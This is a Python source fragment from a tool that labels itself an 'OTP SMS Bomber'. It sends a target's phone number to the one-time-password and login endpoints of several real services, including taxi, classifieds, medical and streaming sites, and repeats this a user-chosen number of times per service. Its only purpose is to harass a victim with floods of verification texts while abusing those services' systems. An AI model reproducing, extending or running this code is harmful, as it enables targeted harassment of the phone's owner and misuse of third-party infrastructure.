...
def send(cellphone):
    ...
    http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        ...
        body=dumps({"cellphone": f"+66{cellphone}"}).encode())

    #2. TAPSI [OK]
    http.request("post", "https://tap33.me/api/v2/user",
        headers={"Content-Type": "application/json"},
        body=dumps({"credential": {"phoneNumber": f"66{cellphone}", "role": "PASSENGER"}}).encode())

    #3. eCharGe [OK]
    http.request("post", "https://www.echarge.ir/m/login?length=19",
        headers={"Content-Type": "application/json"},
        body=dumps({"phoneNumber": f"66{cellphone}"}).encode())

    #4. Divar [OK]
    http.request("post", "https://api.divar.ir/v5/auth/authenticate",
        headers={"Content-Type": "application/json"},
        body=dumps({"phone": f"66{cellphone}"}).encode())
    ...
    http.request("post", "https://drdr.ir/api/registerEnrollment/verifyMobile",
        headers={"Content-Type": "application/json"},
        body=dumps({"phoneNumber": f"66{cellphone}", "userType": "PATIENT"}).encode())

    #8. Filmnet [OK]
    http.request("GET", "https://api-v2.filmnet.ir/access-token/users/66" + cellphone + "/otp")


def spam(args):
    if search(r"^\d{10}$", args.cellphone):
        ...
        print("error: invalid cellphone format, format: 10 digits e.g. 091234xxxx")


def main():
    parser = ArgumentParser(prog="asmsb", description="OTP SMS Bomber", epilog="By MH11")
    parser.add_argument("cellphone", help="target cellphone: e.g. 091234xxxx")
    parser.add_argument("--times", help="count of SMSs (per service!)", type=int, default=1)
